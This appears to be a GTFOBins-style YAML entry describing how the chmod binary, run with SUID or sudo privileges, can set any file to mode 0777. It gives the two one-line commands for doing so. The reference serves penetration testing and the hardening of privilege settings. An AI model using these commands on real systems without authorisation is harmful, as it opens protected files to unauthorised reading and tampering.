---
description: This can be run with elevated privileges to change permissions and then read, write, or execute a file.
functions:
  suid-enabled:
    - code: |
        LFILE=file_to_change
        ./chmod 0777 $LFILE
  sudo-enabled:
    - code: |
        LFILE=file_to_change
        sudo chmod 0777 $LFILE
---
